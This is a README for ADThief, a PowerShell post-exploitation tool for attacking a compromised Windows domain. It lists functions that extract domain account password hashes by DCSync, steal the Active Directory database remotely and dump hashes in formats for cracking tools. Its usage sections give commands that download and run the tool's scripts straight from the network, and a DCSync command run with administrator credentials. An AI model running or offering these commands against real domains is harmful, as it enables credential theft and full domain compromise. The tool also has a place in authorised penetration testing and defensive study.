# ADThief

ADThief is a PowerShell tool to exploit Active Directory database after compromising a Windows domain.

## Usage

To run on a machine, start PowerShell and then load the module:

```
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
```

## Functions

```
Invoke-DCSync                   -   extracts domain accounts from Active Directory, including password hashes
Get-ADDatabase                  -   steals Active Directory database remotely
Dump-ADDatabase                 -   dumps domain accounts from an offline Active Directory database, including password hashes
Mount-ADDatabase                -   mounts an Active Directory database as a local LDAP server
Invoke-LdapSearch               -   searchs for domain objects in a mounted Active Directory database
```

## Prerequisite

The Invoke-DCSync and Dump-ADDatabase functions must be launched on a computer with DSInternals PowerShell module installed. The output of these functions can be formatted using custom views provided by the DSInternals module to support different password cracking tools. The Utils.ps1 file contains a function `Add-DSAccountCustomViews` to add optional views 'SecretsDump' and 'SecretsDumpHistory'.

```
PS C:\> Install-Module DSInternals -Scope CurrentUser
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/Utils.ps1')
PS C:\> Add-DSAccountCustomViews
PS C:\> IEX (New-Object Net.WebClient).DownloadString('https://raw.githubusercontent.com/tmenochet/ADThief/master/ADThief.ps1')
PS C:\> Invoke-DCSync -Server DC.ADATUM.CORP -Credential ADATUM\Administrator | Format-Custom -View SecretsDump
```

## Credits

* https://blog.netspi.com/getting-started-wmi-weaponization-part-4/
* https://github.com/MichaelGrafnetter/DSInternals
